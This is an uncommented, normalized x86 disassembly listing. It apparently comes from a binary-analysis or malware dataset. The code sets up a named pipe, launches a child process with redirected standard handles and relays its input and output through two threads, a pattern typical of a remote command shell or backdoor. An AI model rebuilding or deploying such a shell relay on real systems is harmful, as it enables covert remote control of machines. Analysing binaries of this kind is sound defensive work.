movups [ ebp - 0xef ] xmm0
mov [ ebp - 0xec ] ecx
mov edx 0x12
mov cx [ rw-data ]
mov [ ebp - 0xe8 ] cx
lea ecx [ ebp - 0xf0 ]
mov [ ebp - 0xdf ] 0x0
mov [ ebp - 0xf0 ] 0x4001
mov [ ebp - 0xe6 ] 0x4
mov [ ebp - 0xe2 ] eax
call sub_404820
mov edi [ ebp - 0xf4 ]
jmp r-xdata
mov edx 0x12
mov [ ebp - 0xe6 ] 0x4
lea ecx [ ebp - 0xf0 ]
mov [ ebp - 0xf0 ] 0x4001
call sub_404820
mov eax [ ebp - 0xf8 ]
mov [ ebp - 0xf4 ] eax
mov edi [ ebp - 0xf4 ]
jmp r-xdata
mov eax [ ebp - 0x160 ]
test eax eax
je r-xdata
push eax
call esi
push 0x0
push 0x0
push 0x1
xorps xmm0 xmm0
mov [ ebp - 0x160 ] 0x0
push 0x0
movaps [ ebp - 0x170 ] xmm0
call [ CreateEventW@IAT ]
mov [ ebp - 0x160 ] eax
lea eax [ ebp - 0x170 ]
push eax
push edi
call [ ConnectNamedPipe@IAT ]
test eax eax
jne r-xdata
call esi
mov ecx [ rw-data ]
xorps xmm0 xmm0
movups [ ebp - 0xef ] xmm0
mov [ ebp - 0xec ] ecx
mov edx 0x12
mov cx [ rw-data ]
mov [ ebp - 0xe8 ] cx
lea ecx [ ebp - 0xf0 ]
mov [ ebp - 0xdf ] 0x0
mov [ ebp - 0xf0 ] 0x4001
mov [ ebp - 0xe6 ] 0x4
mov [ ebp - 0xe2 ] eax
call sub_404820
jmp r-xdata
mov eax [ ebp - 0x12c ]
test eax eax
je r-xdata
push eax
call esi
push 0x0
push 0x40000000
push 0x3
lea eax [ ebp - 0x114 ]
push eax
push 0x0
push 0xc0000000
push r--data
call [ CreateFileW@IAT ]
mov [ ebp - 0x108 ] eax
cmp eax 0xffffffff
jne r-xdata
call esi
mov edx eax
cmp edx 0x3e5
je r-xdata
mov eax [ ebp - 0x104 ]
test eax eax
je r-xdata
push eax
call esi
push 0x0
lea eax [ ebp - 0x11c ]
mov [ ebp - 0x11c ] 0x0
push eax
lea eax [ ebp - 0x170 ]
push eax
push edi
call [ GetOverlappedResult@IAT ]
test eax eax
jne r-xdata
call esi
mov ecx [ rw-data ]
xorps xmm0 xmm0
movups [ ebp - 0xef ] xmm0
mov [ ebp - 0xec ] ecx
mov edx 0x12
mov cx [ rw-data ]
mov [ ebp - 0xe8 ] cx
lea ecx [ ebp - 0xf0 ]
mov [ ebp - 0xdf ] 0x0
mov [ ebp - 0xf0 ] 0x4001
mov [ ebp - 0xe6 ] 0x4
mov [ ebp - 0xe2 ] eax
call sub_404820
jmp r-xdata
mov ecx [ rw-data ]
xorps xmm0 xmm0
mov ax [ rw-data ]
movups [ ebp - 0xef ] xmm0
mov [ ebp - 0xdf ] 0x0
mov [ ebp - 0xec ] ecx
lea ecx [ ebp - 0xf0 ]
mov [ ebp - 0xe2 ] edx
mov edx 0x12
mov [ ebp - 0xf0 ] 0x4001
mov [ ebp - 0xe8 ] ax
mov [ ebp - 0xe6 ] 0x4
call sub_404820
jmp r-xdata
mov eax [ ebp - 0xf4 ]
test eax eax
je r-xdata
push eax
call esi
push 0x44
lea eax [ ebp - 0x1c0 ]
push 0x0
push eax
call sub_411230
mov eax [ ebp - 0x108 ]
xorps xmm0 xmm0
mov [ ebp - 0x188 ] eax
mov eax [ ebp - 0xf4 ]
push 0xc6
mov [ ebp - 0x184 ] eax
mov [ ebp - 0x180 ] eax
lea eax [ ebp - 0xce ]
push 0x0
push eax
mov [ ebp - 0x1c0 ] 0x44
mov [ ebp - 0x194 ] 0x101
movaps [ ebp - 0x130 ] xmm0
call sub_411230
mov eax [ r--data ]
add esp 0x18
movq xmm0 [ r--data ]
mov [ ebp - 0xc8 ] eax
mov ax [ r--data ]
mov [ ebp - 0xc4 ] ax
lea eax [ ebp - 0x130 ]
push eax
lea eax [ ebp - 0x1c0 ]
movq [ ebp - 0xd0 ] xmm0
push eax
push 0x0
push 0x0
push 0x10
push 0x1
push 0x0
push 0x0
lea eax [ ebp - 0xd0 ]
push eax
push 0x0
call [ CreateProcessW@IAT ]
test eax eax
jne r-xdata
call esi
mov ecx [ rw-data ]
xorps xmm0 xmm0
movups [ ebp - 0xef ] xmm0
mov [ ebp - 0xec ] ecx
mov edx 0x12
mov cx [ rw-data ]
mov [ ebp - 0xe8 ] cx
lea ecx [ ebp - 0xf0 ]
mov [ ebp - 0xdf ] 0x0
mov [ ebp - 0xf0 ] 0x4001
mov [ ebp - 0xe6 ] 0x4
mov [ ebp - 0xe2 ] eax
call sub_404820
jmp r-xdata
test edi edi
je r-xdata
push eax
call esi
mov eax [ rw-data ]
lea ecx [ ebp - 0xf0 ]
xorps xmm0 xmm0
mov [ ebp - 0xdf ] 0x0
movups [ ebp - 0xef ] xmm0
mov [ ebp - 0xec ] eax
mov edx 0x12
mov ax [ rw-data ]
mov [ ebp - 0xf0 ] 0x4002
mov [ ebp - 0xe8 ] ax
mov [ ebp - 0xe6 ] 0x4
mov [ ebp - 0xe2 ] 0x0
call sub_404820
push 0x74
lea eax [ ebp - 0x238 ]
push 0x0
push eax
call sub_411230
mov eax [ ebp - 0xfc ]
add esp 0xc
mov [ ebp - 0x238 ] eax
mov ecx 0x1a
mov eax [ ebp - 0x104 ]
mov esi rw-data
mov [ ebp - 0x234 ] eax
lea eax [ ebp - 0x174 ]
push eax
push 0x0
lea eax [ ebp - 0x238 ]
mov [ ebp - 0x230 ] edi
push eax
push sub_406490
lea edi [ ebp - 0x22c ]
push 0x0
[ edi ] [ esi ]
mov esi [ CreateThread@IAT ]
push 0x0
call esi
mov [ ebp - 0xf8 ] eax
lea eax [ ebp - 0x178 ]
push eax
push 0x0
lea eax [ ebp - 0x238 ]
push eax
push sub_406690
push 0x0
push 0x0
call esi
mov esi [ ebp - 0xf8 ]
mov edi eax
mov [ ebp - 0x120 ] edi
test esi esi
je r-xdata
call esi
mov ecx [ rw-data ]
xorps xmm0 xmm0
movups [ ebp - 0xef ] xmm0
mov [ ebp - 0xec ] ecx
mov edx 0x12
mov cx [ rw-data ]
mov [ ebp - 0xe8 ] cx
lea ecx [ ebp - 0xf0 ]
mov [ ebp - 0xdf ] 0x0
mov [ ebp - 0xf0 ] 0x4001
mov [ ebp - 0xe6 ] 0x4
mov [ ebp - 0xe2 ] eax
call sub_404820
jmp r-xdata
mov eax [ ebp - 0x108 ]
test eax eax
je r-xdata
push edi
call esi
call [ GetLastError@IAT ]
test edi edi
je r-xdata
mov eax [ ebp - 0xfc ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ ebp - 0x130 ]
push 0xffffffff
mov [ ebp - 0xd4 ] eax
lea eax [ ebp - 0xdc ]
push 0x0
push eax
push 0x3
mov [ ebp - 0xdc ] esi
mov [ ebp - 0xd8 ] edi
call [ WaitForMultipleObjects@IAT ]
push [ ebp - 0xfc ]
call [ SetEvent@IAT ]
push 0xffffffff
push esi
mov esi [ WaitForSingleObject@IAT ]
call esi
push 0xffffffff
push edi
call esi
jmp r-xdata
mov eax [ ebp - 0xf8 ]
test eax eax
je r-xdata
push eax
call esi
mov edi [ ebp - 0x100 ]
mov edi [ ebp - 0x120 ]
test edi edi
je r-xdata
push eax
call esi
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_40d56a
mov esp ebp
pop ebp
mov esp ebx
pop ebx
retn
push edi
call esi
sub_406490
push ebp
mov ebp esp
mov eax 0x1003c
call sub_429c10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push 0x0
push 0x0
push 0x1
push 0x0
mov [ ebp - 0x1001c ] esi
call [ CreateEventW@IAT ]
mov ecx [ esi ]
mov edi eax
mov ebx [ GetLastError@IAT ]
xorps xmm0 xmm0
mov [ ebp - 0x1002c ] 0x0
mov [ ebp - 0x10020 ] edi
mov [ ebp - 0x10028 ] ecx
mov [ ebp - 0x10024 ] edi
movups [ ebp - 0x1003c ] xmm0
mov [ ebp - 0x1002c ] edi
mov [ ebp - 0x10018 ] 0x0
push 0xffffffff
push 0x0
lea eax [ ebp - 0x10028 ]
push eax
push 0x2
call [ WaitForMultipleObjects@IAT ]
cmp eax 0x1
jne r-xdata
call ebx
cmp eax 0x3e5
jne r-xdata
mov edi [ ebp - 0x10020 ]
test edi edi
je r-xdata
push 0x0
lea eax [ ebp - 0x10018 ]
push eax
lea eax [ ebp - 0x1003c ]
push eax
push [ esi + 0x4 ]
call [ GetOverlappedResult@IAT ]
test eax eax
je r-xdata
call ebx
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40d56a
mov esp ebp
pop ebp
retn
push edi
call [ CloseHandle@IAT ]
cmp [ ebp - 0x10018 ] 0x0
je r-xdata
push 0xf010
lea eax [ ebp - 0x10014 ]
push 0x0
push eax
call sub_411230
add esp 0xc
call [ GetOEMCP@IAT ]
push 0x0
push 0x0
push [ ebp - 0x10018 ]
mov edi eax
lea eax [ ebp - 0x1004 ]
push eax
push 0x0
push edi
call [ MultiByteToWideChar@IAT ]
mov esi eax
test esi esi
je r-xdata
call ebx
push esi
lea eax [ ebp - 0x10006 ]
push eax
push [ ebp - 0x10018 ]
lea eax [ ebp - 0x1004 ]
push eax
push 0x0
push edi
call [ MultiByteToWideChar@IAT ]
mov esi eax
jmp r-xdata
xor edx edx
lea edx [ esi * 2 + 0x2 ]
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x10010 ] eax
mov ax [ rw-data ]
mov [ ebp - 0x10014 ] 0x4003
mov [ ebp - 0x1000c ] ax
test esi esi
jle r-xdata
mov esi [ ebp - 0x1001c ]
jmp r-xdata
mov [ ebp - 0x1000a ] edx
lea ecx [ ebp - 0x10014 ]
add edx 0xe
call sub_404820
test eax eax
jne r-xdata
push 0x1000
lea eax [ ebp - 0x1004 ]
push 0x0
push eax
call sub_411230
push 0xf010
lea eax [ ebp - 0x10014 ]
push 0x0
push eax
call sub_411230
add esp 0x18
lea eax [ ebp - 0x1003c ]
push eax
lea eax [ ebp - 0x10018 ]
push eax
push 0x1000
lea eax [ ebp - 0x1004 ]
push eax
push [ esi + 0x4 ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
sub_406690
push ebp
mov ebp esp
mov eax 0x1014
call sub_429c10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x100c ] eax
mov eax [ rw-data ]
push ebx
mov [ ebp - 0x1014 ] eax
mov eax [ rw-data ]
push 0x1000
mov [ ebp - 0x1010 ] eax
lea eax [ ebp - 0x1004 ]
push 0x0
push eax
mov [ ebp - 0x1008 ] 0x0
call sub_411230
mov ebx [ WaitForMultipleObjects@IAT ]
lea eax [ ebp - 0x1014 ]
add esp 0xc
push 0xffffffff
push 0x0
push eax
push 0x2
call ebx
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop ebx
call sub_40d56a
mov esp ebp
pop ebp
retn
push edi
mov edi [ GetLastError@IAT ]
push esi
nop [ eax ] eax
push 0x1000
lea eax [ ebp - 0x1004 ]
push 0x0
push eax
call sub_411230
add esp 0xc
lea eax [ ebp - 0x1014 ]
push 0xffffffff
push 0x0
push eax
push 0x2
call ebx
test eax eax
je r-xdata
mov esi [ rw-data ]
lea eax [ ebp - 0x1004 ]
push esi
push rw-data
push eax
call sub_4117a0
add esp 0xc
push [ rw-data ]
call [ ResetEvent@IAT ]
push 0x0
lea eax [ ebp - 0x1008 ]
push eax
push esi
lea eax [ ebp - 0x1004 ]
push eax
mov eax [ ebp - 0x100c ]
push [ eax + 0x8 ]
call [ WriteFile@IAT ]
test eax eax
jne r-xdata
cmp [ rw-data ] 0x4004
jne r-xdata
pop esi
pop edi
call edi
cmp eax 0x3e5
jne r-xdata
sub_4067b0
push esi
mov esi ecx
mov eax [ esi + 0x14 ]
cmp eax 0x10
jb r-xdata
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
cmp [ esi + 0x14 ] 0x10
jb r-xdata
inc eax
push eax
push [ esi ]
call sub_406f10
mov [ esi ] 0x0
pop esi
retn
mov eax [ esi ]
pop esi
mov [ eax ] 0x0
retn
sub_4067f0
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ ebp + 0x8 ]
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
cmp [ ecx ] 0x0
jne r-xdata
mov edx ecx
push edi
lea edi [ edx + 0x1 ]
xor edx edx
push edx
push ecx
mov ecx esi
call sub_406a90
mov eax esi
pop esi
pop ebp
retn 0x4
mov al [ edx ]
inc edx
test al al
jne r-xdata
sub edx edi
pop edi
push edx
push ecx
mov ecx esi
call sub_406a90
mov eax esi
pop esi
pop ebp
retn 0x4
sub_406850
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
push esi
mov esi [ rw-data ]
test esi esi
je r-xdata
nop [ eax ] eax
test ecx ecx
je r-xdata
mov eax [ ecx + esi * 4 - 0x4 ]
dec esi
test eax eax
je r-xdata
sub eax 0x1
jne r-xdata
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
pop esi
retn
cmp esi 0x3fffffff
ja r-xdata
test esi esi
jne r-xdata
push eax
call j_sub_41a3a5
mov ecx [ rw-data ]
add esp 0x4
call sub_413b11
lea eax [ esi * 4 ]
cmp eax 0x1000
jb r-xdata
mov esi [ rw-data ]
push ecx
call j_sub_41a3a5
add esp 0x4
test cl 0x1f
jne r-xdata
call sub_413b11
mov eax [ ecx - 0x4 ]
cmp eax ecx
jae r-xdata
call sub_413b11
sub ecx eax
cmp ecx 0x4
jb r-xdata
call sub_413b11
cmp ecx 0x23
ja r-xdata
call sub_413b11
mov ecx eax
sub_406910
push ebp
mov ebp esp
mov edx [ rw-data ]
mov ecx [ rw-data ]
push esi
mov esi [ rw-data ]
push edi
lea eax [ esi + edx ]
test al 0x3
jne r-xdata
lea eax [ ecx * 4 - 0x1 ]
dec ecx
and esi eax
mov [ rw-data ] esi
add esi edx
mov eax esi
shr eax 0x2
and ecx eax
mov eax [ rw-data ]
lea edi [ ecx * 4 ]
cmp [ edi + eax ] 0x0
jne r-xdata
lea eax [ edx + 0x4 ]
shr eax 0x2
cmp ecx eax
ja r-xdata
mov eax [ edi + eax ]
and esi 0x3
pop edi
lea ecx [ eax + esi * 4 ]
pop esi
test ecx ecx
je r-xdata
push 0x10
call sub_40d5ac
mov ecx eax
add esp 0x4
test ecx ecx
je r-xdata
push ecx
call sub_406d30
mov edx [ rw-data ]
mov esi [ rw-data ]
mov ecx [ rw-data ]
inc edx
mov [ rw-data ] edx
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
mov edx [ rw-data ]
call sub_413b11
mov eax [ rw-data ]
mov [ edi + eax ] ecx
mov edx [ rw-data ]
mov eax [ rw-data ]
sub_4069d0
push esi
mov esi ecx
cmp [ esi + 0x10 ] 0x0
je r-xdata
push edi
mov edi [ esi + 0x8 ]
test edi edi
je r-xdata
nop [ eax ] eax
mov ecx [ esi + 0x4 ]
pop edi
test ecx ecx
je r-xdata
nop [ eax + eax ] eax
cmp [ esi + 0x10 ] 0x0
jne r-xdata
mov [ esi + 0xc ] 0x0
mov [ esi + 0x8 ] 0x0
mov [ esi + 0x4 ] 0x0
pop esi
retn
mov eax [ esi + 0x8 ]
cmp eax 0x3fffffff
ja r-xdata
test edi edi
jne r-xdata
push eax
call j_sub_41a3a5
add esp 0x4
add [ esi + 0x10 ] 0xffffffff
jne r-xdata
call sub_413b11
shl eax 0x2
cmp eax 0x1000
jb r-xdata
mov eax [ esi + 0x4 ]
dec edi
mov eax [ eax + edi * 4 ]
test eax eax
je r-xdata
push ecx
call j_sub_41a3a5
add esp 0x4
test cl 0x1f
jne r-xdata
call sub_413b11
mov eax [ ecx - 0x4 ]
cmp eax ecx
jae r-xdata
call sub_413b11
sub ecx eax
cmp ecx 0x4
jb r-xdata
call sub_413b11
cmp ecx 0x23
ja r-xdata
call sub_413b11
mov ecx eax
sub_406a90
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
test ebx ebx
je r-xdata
push edi
mov edi [ ebp + 0xc ]
cmp edi 0xfffffffe
ja r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx 0x10
jb r-xdata
push r--data
call sub_40e50b
cmp [ esi + 0x14 ] edi
jae r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
test edi edi
jne r-xdata
push [ esi + 0x10 ]
mov ecx esi
push edi
call sub_4070d0
test edi edi
je r-xdata
cmp ecx 0x10
jb r-xdata
cmp ebx eax
jb r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov [ esi + 0x10 ] edi
cmp [ esi + 0x14 ] 0x10
jb r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
mov edx esi
mov edx [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
pop edi
pop esi
pop ebx
mov [ eax ] 0x0
pop ebp
retn 0x8
mov eax [ esi ]
pop edi
mov [ eax ] 0x0
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
cmp ecx 0x10
jb r-xdata
mov eax [ esi + 0x10 ]
add eax edx
cmp eax ebx
jbe r-xdata
mov [ esi + 0x10 ] edi
cmp [ esi + 0x14 ] 0x10
jb r-xdata
push edi
push ebx
push eax
call sub_4117a0
add esp 0xc
test edi edi
je r-xdata
push [ ebp + 0xc ]
mov eax esi
mov ecx esi
sub ebx eax
push ebx
push esi
call sub_406b90
pop esi
pop ebx
pop ebp
retn 0x8
push [ ebp + 0xc ]
mov eax [ esi ]
mov ecx esi
sub ebx eax
push ebx
push esi
call sub_406b90
pop esi
pop ebx
pop ebp
retn 0x8
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
mov [ eax + edi ] 0x0
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_406b90
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
mov ecx [ ebp + 0xc ]
push edi
mov eax [ ebx + 0x10 ]
cmp eax ecx
jb r-xdata
push r--data
call sub_40e52b
mov edi [ ebp + 0x10 ]
sub eax ecx
cmp edi eax
cmova edi eax
cmp esi ebx
jne r-xdata
cmp edi 0xfffffffe
ja r-xdata
lea eax [ ecx + edi ]
cmp [ esi + 0x10 ] eax
jb r-xdata
push r--data
call sub_40e50b
cmp [ esi + 0x14 ] edi
jae r-xdata
push r--data
call sub_40e52b
mov [ esi + 0x10 ] eax
cmp [ esi + 0x14 ] 0x10
jb r-xdata
test edi edi
jne r-xdata
push [ esi + 0x10 ]
mov ecx esi
push edi
call sub_4070d0
mov ecx [ ebp + 0xc ]
test edi edi
je r-xdata
mov edx esi
push ecx
push 0x0
mov ecx esi
mov [ edx + eax ] 0x0
call sub_407030
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov edx [ esi ]
push ecx
push 0x0
mov ecx esi
mov [ edx + eax ] 0x0
call sub_407030
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
cmp [ ebx + 0x14 ] 0x10
jb r-xdata
mov [ esi + 0x10 ] edi
cmp [ esi + 0x14 ] 0x10
jb r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov ebx [ ebx ]
mov eax esi
pop edi
pop esi
pop ebx
mov [ eax ] 0x0
pop ebp
retn 0xc
mov eax [ esi ]
pop edi
mov [ eax ] 0x0
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov edx esi
mov edx [ esi ]
jmp r-xdata
mov [ esi + 0x10 ] edi
cmp [ esi + 0x14 ] 0x10
jb r-xdata
push edi
lea eax [ ebx + ecx ]
push eax
push edx
call sub_4117a0
add esp 0xc
test edi edi
je r-xdata
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
mov [ eax + edi ] 0x0
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_406cc0
push 0x8
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
call sub_40d5ac
add esp 0x4
test eax eax
je sub_413b11
mov [ rw-data ] eax
mov [ eax ] 0x0
mov [ eax + 0x4 ] 0x0
mov eax [ rw-data ]
mov [ eax ] rw-data
mov eax rw-data
retn
sub_406d30
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
mov edi [ rw-data ]
mov esi 0x1
test edi edi
cmovne esi edi
nop [ eax ] eax
mov eax 0xfffffff
sub eax esi
cmp eax esi
jb r-xdata
cmp esi 0x8
jae r-xdata
push r--data
call sub_40e50b
add esi esi
jmp r-xdata
mov ebx [ rw-data ]
sub esi edi
shr ebx 0x2
mov [ ebp - 0xc ] ebx
lea eax [ edi + esi ]
test eax eax
jne r-xdata
mov eax esi
sub eax edi
cmp eax 0x1
jb r-xdata
cmp eax 0x3fffffff
ja r-xdata
xor edx edx
mov [ ebp - 0x4 ] edx
jmp r-xdata
call sub_40e4ee
shl eax 0x2
cmp eax 0x1000
jb r-xdata
mov eax [ rw-data ]
shl ebx 0x2
shl edi 0x2
mov [ ebp - 0x8 ] ebx
lea ecx [ ebx + eax ]
add ebx edx
sub edi ecx
add edi eax
push edi
push ecx
push ebx
call sub_410380
add esp 0xc
lea edx [ edi + ebx ]
mov [ ebp - 0x10 ] edx
cmp [ ebp - 0xc ] esi
ja r-xdata
push eax
call sub_40d5ac
mov edx eax
add esp 0x4
mov [ ebp - 0x4 ] edx
test edx edx
jne r-xdata
lea ecx [ eax + 0x23 ]
cmp ecx eax
jbe r-xdata
mov ecx [ rw-data ]
lea edi [ esi * 4 ]
push edi
push ecx
push edx
call sub_410380
mov eax [ rw-data ]
mov edx [ ebp - 0x8 ]
mov ebx [ ebp - 0x4 ]
lea ecx [ edi + eax ]
sub edx ecx
add edx eax
push edx
push ecx
push ebx
mov [ ebp - 0x8 ] edx
call sub_410380
mov eax [ ebp - 0x8 ]
push edi
push 0x0
add eax ebx
push eax
mov ebx [ ebp - 0x8 ]
mov edi ebx
mov eax [ rw-data ]
push edi
push eax
push edx
call sub_410380
mov eax esi
sub eax [ ebp - 0xc ]
shl eax 0x2
push eax
mov eax [ ebp - 0x10 ]
add eax edi
push 0x0
push eax
call sub_411230
push ebx
mov ebx [ ebp - 0x4 ]
push 0x0
push ebx
jmp r-xdata
mov edi [ rw-data ]
jmp r-xdata
call sub_40e4ee
push ecx
call sub_40d5ac
add esp 0x4
test eax eax
je r-xdata
add [ rw-data ] esi
pop edi
pop esi
mov [ rw-data ] ebx
pop ebx
mov esp ebp
pop ebp
retn 0x4
push [ rw-data ]
push eax
call sub_401ef0
call sub_411230
mov eax [ rw-data ]
add esp 0x24
test eax eax
je r-xdata
call sub_413b11
call sub_413b11
lea edx [ eax + 0x23 ]
and edx 0xffffffe0
mov [ ebp - 0x4 ] edx
mov [ edx - 0x4 ] eax
sub_406f10
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
cmp ecx 0xffffffff
ja r-xdata
call sub_413b11
cmp ecx 0x1000
jb r-xdata
push eax
call j_sub_41a3a5
add esp 0x4
pop ebp
retn 0x8
test al 0x1f
jne r-xdata
call sub_413b11
mov ecx [ eax - 0x4 ]
cmp ecx eax
jae r-xdata
call sub_413b11
sub eax ecx
cmp eax 0x4
jb r-xdata
call sub_413b11
cmp eax 0x23
ja r-xdata
call sub_413b11
mov eax ecx
sub_406f70
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp edi 0xfffffffe
ja r-xdata
push r--data
call sub_40e50b
mov eax [ esi + 0x14 ]
cmp eax edi
jae r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
push [ esi + 0x10 ]
push edi
call sub_4070d0
xor eax eax
cmp eax edi
pop edi
sbb eax eax
neg eax
pop esi
pop ebp
retn 0x8
test edi edi
jne r-xdata
cmp edi 0x10
jae r-xdata
xor eax eax
cmp eax edi
pop edi
sbb eax eax
neg eax
pop esi
pop ebp
retn 0x8
mov [ esi + 0x10 ] edi
cmp eax 0x10
jb r-xdata
push ebx
mov ebx [ esi + 0x10 ]
cmp edi ebx
cmovb ebx edi
cmp eax 0x10
jb r-xdata
mov [ esi ] 0x0
mov esi [ esi ]
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] ebx
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov eax [ esi ]
mov [ ebp + 0xc ] eax
test ebx ebx
je r-xdata
xor eax eax
mov [ esi + ebx ] 0x0
cmp eax edi
pop ebx
sbb eax eax
pop edi
neg eax
pop esi
pop ebp
retn 0x8
mov esi [ esi ]
mov eax [ esi + 0x14 ]
mov ecx esi
inc eax
push eax
push [ ebp + 0xc ]
call sub_406f10
push ebx
push eax
push esi
call sub_4117a0
add esp 0xc
sub_407030
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ ebp + 0x8 ]
push edi
mov edi [ esi + 0x10 ]
cmp edi ecx
jb r-xdata
push r--data
call sub_40e52b
mov edx [ ebp + 0xc ]
mov eax edi
sub eax ecx
cmp eax edx
ja r-xdata
test edx edx
je r-xdata
mov [ esi + 0x10 ] ecx
cmp [ esi + 0x14 ] 0x10
jb r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov eax esi
pop edi
pop esi
mov [ eax + ecx ] 0x0
pop ebp
retn 0x8
mov eax [ esi ]
pop edi
mov [ eax + ecx ] 0x0
mov eax esi
pop esi
pop ebp
retn 0x8
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov [ esi + 0x10 ] edi
cmp [ esi + 0x14 ] 0x10
pop ebx
jb r-xdata
push eax
lea eax [ ebx + edx ]
push eax
push ebx
call sub_410380
add esp 0xc
sub edi edx
push ebx
lea ebx [ eax + ecx ]
mov eax edi
sub eax ecx
je r-xdata
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
mov [ eax + edi ] 0x0
mov eax esi
pop edi
pop esi
pop ebp
retn 0x8
sub_4070d0
push ebp
mov ebp esp
push 0xffffffff
push sub_42a4d0
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
mov [ ebp - 0x14 ] esi
mov eax [ ebp + 0x8 ]
mov edi eax
or edi 0xf
cmp edi 0xfffffffe
jbe r-xdata
mov ebx [ esi + 0x14 ]
mov eax 0xaaaaaaab
mul edi
mov ecx ebx
shr ecx 0x1
shr edx 0x1
cmp ecx edx
jbe r-xdata
mov edi eax
jmp r-xdata
lea eax [ edi + 0x1 ]
mov [ ebp - 0x4 ] 0x0
test eax eax
jne r-xdata
mov eax 0xfffffffe
lea edi [ ebx + ecx ]
sub eax ecx
cmp ebx eax
jbe r-xdata
cmp eax 0xffffffff
jbe r-xdata
xor ebx ebx
jmp r-xdata
mov edi 0xfffffffe
cmp eax 0x1000
jb r-xdata
call sub_40e4ee
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
push eax
call sub_40d5ac
mov ebx eax
add esp 0x4
test ebx ebx
jne r-xdata
lea ecx [ eax + 0x23 ]
cmp ecx eax
ja r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x10
jb r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
call sub_413b11
push ecx
call sub_40d5ac
add esp 0x4
test eax eax
jne r-xdata
call sub_40e4ee
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
cmp [ esi + 0x14 ] 0x10
jb r-xdata
inc eax
mov ecx esi
push eax
push [ esi ]
call sub_406f10
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
lea ebx [ eax + 0x23 ]
and ebx 0xffffffe0
mov [ ebx - 0x4 ] eax
jmp r-xdata
call sub_413b11
mov eax esi
mov eax [ esi ]
jmp r-xdata
push eax
push ecx
push ebx
call sub_4117a0
add esp 0xc
test eax eax
je r-xdata
mov [ esi + eax ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov esi ebx
mov [ eax ] 0x0
mov eax [ ebp + 0xc ]
mov [ esi ] ebx
mov [ esi + 0x14 ] edi
mov [ esi + 0x10 ] eax
cmp [ esi + 0x14 ] 0x10
jb r-xdata
sub_40723e
mov esi [ ebp - 0x14 ]
mov eax [ esi + 0x14 ]
cmp eax 0x10
jb r-xdata
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
cmp [ esi + 0x14 ] 0x10
jb r-xdata
inc eax
mov ecx esi
push eax
push [ esi ]
call sub_406f10
push 0x0
push 0x0
mov [ esi ] 0x0
call sub_4111b8
int3
mov esi [ esi ]
sub_407280
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
cmp eax 0xffffffff
ja r-xdata
pop ebp
retn 0x4
call sub_40e4ee
cmp eax 0x1000
jb r-xdata
push eax
call sub_40d5ac
add esp 0x4
test eax eax
